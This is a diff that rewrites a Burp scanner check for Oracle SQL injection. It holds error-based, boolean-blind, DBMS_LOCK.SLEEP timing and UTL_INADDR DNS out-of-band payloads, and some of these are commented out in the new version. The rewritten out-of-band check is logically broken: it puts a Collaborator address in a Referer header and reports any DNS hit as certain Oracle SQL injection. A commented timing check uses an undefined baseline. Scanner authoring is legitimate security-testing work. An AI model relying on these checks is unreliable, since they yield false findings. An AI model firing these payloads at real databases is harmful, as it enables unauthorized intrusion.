@@ -1,64 +1,52 @@
-# Oracle SQL Injection Detection
-# Tests error-based, boolean-based, time-based, and OOB SQLi
+metadata:
+    language: v2-beta
+    name: "Oracle SQL Injection Detection"
+    description: "Error-based, boolean-blind and Collaborator OOB checks for Oracle DB (parser-safe, non-destructive)."
+    author: "You"
 
-given insertion_point: "request"
+define:
+    payload_err = "'"
+    payload_true = "' AND 1=1--"
+    payload_false = "' AND 1=2--"
+    # payload_sleep = "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)=0--"   # uncomment only if your Burp supports timing
+    # payload_utl = "'; BEGIN UTL_INADDR.GET_HOST_ADDRESS(''test.' || {generate_collaborator_address()} || '''); END;--"  # commented: enable only with authorization
 
-# Extract baseline response
-extract original_body from response.body
-extract original_status from response.status
-extract original_time from response.time
+given insertion point then
 
-# 1. Error-Based: Trigger Oracle syntax error
-send request:
-  replace insertion_point with insertion_point + "'"
-if regex `ORA-01756|ORA-00933|missing expression` in response.body then
-  report issue:
-    severity: high
-    confidence: certain
-    name: "Oracle SQL Injection (Error-Based)"
-    detail: "Oracle error detected with payload: {insertion_point + '''}. Response: {regex `ORA-01756|ORA-00933|missing expression`}"
-    remediation: "Use bind variables or parameterized queries."
-end if
+    # 1) Error-based: append single-quote and look for Oracle error strings
+    send payload: appending: {payload_err}
+    if {latest.response} matches "(?i)ORA-01756|ORA-00933|missing expression|ORA-[0-9]{3,}" then
+        report issue: name: "Oracle SQL Injection (Error-Based)" severity: high confidence: certain remediation: "Use bind variables and parameterized queries; hide detailed DB errors." detail: "Oracle error text observed after appending a quote; possible error-based SQLi."
+    end if
 
-# 2. Boolean-Based Blind: Check response content change
-send request:
-  replace insertion_point with insertion_point + "' AND 1=1--"
-extract true_response from response.body
+    # 2) Boolean-based blind: send simple true/false payloads and compare responses
+    send payload called true_check: appending: {payload_true}
+    send payload called false_check: appending: {payload_false}
+    if {true_check.response} differs from {false_check.response} then
+        report issue: name: "Oracle SQL Injection (Boolean-Based Blind)" severity: high confidence: firm remediation: "Sanitize inputs and use bind variables/parameterized queries." detail: "Responses differ between boolean true and false payloads; possible boolean-blind SQLi."
+    end if
 
-send request:
-  replace insertion_point with insertion_point + "' AND 1=2--"
-extract false_response from response.body
+    # Optional: Time-based blind using DBMS_LOCK.SLEEP (commented — enable only if your Burp supports timing)
+    # send payload: appending: {payload_sleep}
+    # if ({latest.response.time} - {base.response.time}) >= 4.5 then
+    #     report issue: name: "Oracle SQL Injection (Time-Based Blind - sec)" severity: high confidence: tentative remediation: "Use bind variables and avoid dynamic SQL; limit long-running queries." detail: "Response delayed by DBMS_LOCK.SLEEP payload (~5s); timing indicates possible blind SQLi."
+    # end if
+    #
+    # If your Burp exposes time_ms instead, use:
+    # send payload: appending: {payload_sleep}
+    # if ({latest.response.time_ms} - {base.response.time_ms}) >= 4500 then
+    #     report issue: name: "Oracle SQL Injection (Time-Based Blind - ms)" severity: high confidence: tentative remediation: "Use bind variables and avoid dynamic SQL; limit long-running queries." detail: "Response delayed by DBMS_LOCK.SLEEP payload (~5s); timing indicates possible blind SQLi."
+    # end if
 
-if true_response != false_response and true_response == original_body then
-  report issue:
-    severity: high
-    confidence: firm
-    name: "Oracle SQL Injection (Boolean-Based Blind)"
-    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
-    remediation: "Sanitize inputs and use parameterized queries."
-end if
+    # 3) Safe OOB: Collaborator via header (non-destructive)
+    send request called collab_header_check: method: "GET" headers: "Referer": {generate_collaborator_address()} path: "/"
+    if dns interactions then
+        report issue: name: "Oracle SQL Injection (Out-of-Band)" severity: high confidence: certain remediation: "Disable unnecessary PL/SQL packages and avoid using untrusted input in code that can trigger external network calls." detail: "Burp Collaborator observed DNS interactions after sending a request containing the collaborator address in a header; possible OOB SQLi."
+    end if
 
-# 3. Time-Based Blind: Use DBMS_LOCK.SLEEP
-send request:
-  replace insertion_point with insertion_point + "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)=0--"
-  set timeout to 10 seconds
-if response.time > original_time + 5000 then
-  report issue:
-    severity: high
-    confidence: tentative
-    name: "Oracle SQL Injection (Time-Based Blind)"
-    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)=0--'}"
-    remediation: "Implement strict input validation and use bind variables."
-end if
-
-# 4. Out-of-Band: DNS via UTL_INADDR
-send request:
-  replace insertion_point with insertion_point + "'; BEGIN UTL_INADDR.GET_HOST_ADDRESS('test.' || collaborator_address); END;--"
-if dns interactions then
-  report issue:
-    severity: high
-    confidence: certain
-    name: "Oracle SQL Injection (Out-of-Band)"
-    detail: "DNS interaction detected via Collaborator with payload: {insertion_point + '''; BEGIN UTL_INADDR.GET_HOST_ADDRESS('test.' || collaborator_address); END;--'}"
-    remediation: "Disable unnecessary PL/SQL packages and use parameterized queries."
-end if
+    # Optional: UTL_INADDR OOB attempt (commented — enable only with explicit authorization)
+    # This attempts to call UTL_INADDR to force a DNS lookup; requires DB privileges and can be noisy.
+    # send payload: appending: {payload_utl}
+    # if dns interactions then
+    #     report issue: name: "Oracle SQL Injection (Out-of-Band - UTL_INADDR)" severity: high confidence: certain remediation: "Disable or restrict UTL_INADDR and similar packages; use least-privilege DB accounts and parameterized queries." detail: "Burp Collaborator observed DNS interactions after UTL_INADDR payload; high-confidence OOB SQLi."
+    # end if
